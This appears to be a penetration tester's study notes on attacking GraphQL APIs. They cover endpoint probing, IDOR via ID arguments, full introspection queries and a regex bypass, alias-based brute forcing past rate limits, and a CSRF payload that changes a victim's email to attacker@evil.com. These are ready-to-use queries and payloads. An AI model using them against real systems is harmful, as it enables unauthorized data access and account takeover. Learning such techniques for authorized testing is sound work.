# Test for graphql endpoints
Universal query
```graphql
query{__typename}
```
always returns
```json
{"data": {"__typename": "query"}}
```

Common endpoint names:
* /graphql
* /api
* /api/graphql
* /graphql/api
* /graphql/graphql
If these common endpoints don't return a GraphQL response, you could also try appending /v1 to the path. 

request methods
Common is `POST` with `application/json`, but it can variate.

#  Exploiting unsanitized arguments
For example:
```graphql
query {
	products {
		id
		name
		listed
	}
}
```
   returns
```graphql
    {
        "data": {
            "products": [
                {
                    "id": 1,
					...
                },
                {
                    "id": 2,
					...
                },
                {
                    "id": 4,
					...
                }
            ]
        }
    }
```        
so we can try to access the third product: [[IDOR]]
```graphql
query {
	product(id: 3) {
		id
		name
		listed
	}
}
```    
#  Discovering schema information
### Introspection 
###### Burp Suite:
`GraphQL > Set introspection query`
##### Request example
```graphql
{
	"query": "{__schema{queryType{name}}}"
}
```
returns list of available query names
###### Full introspection query:
```graphql
query IntrospectionQuery {
	__schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }
```
######  Visualizing introspection results 
 http://nathanrandal.com/graphql-visualizer/
### Suggestions
Used when instrospection is disabled.
Suggestions are messages like this:
`There is no entry for 'productInfo'. Did you mean 'productInformation' instead?`
Can be automated with https://github.com/nikitastupin/clairvoyance or Burp scanner.

###  Bypassing GraphQL introspection defenses 
`__schema` can be disabled using regex by developers.
```graphql
{
	"query": "query{__schema
	{queryType{name}}}"
}
```
Also try a `GET` request, or a `POST` request with a content-type of `x-www-form-urlencoded`.

# Bypassing rate limiting using aliases
#rate-limiting [[Brute Force]] #auth 
Aliases allows to make several queries inside one HTTP request.
It can be used for brute-force. Example:
```graphql
query isValidDiscount() {
	isvalidDiscount(code: 1){
		valid
	}
	isValidDiscount2:isValidDiscount(code: 2){
		valid
	}
	isValidDiscount3:isValidDiscount(code: 3){
		valid
	}
}
```

# Graphql [[CSRF]]
Possible if graphql endpoint doesn't validate `Content-Type` and `x-www-form-urlencoded` works.
Example:
```
query=mutation changeEmail($input: ChangeEmailInput!) {changeEmail(input: $input) {email}}&variables={"input":{"email":"attacker@evil.com"}}
```


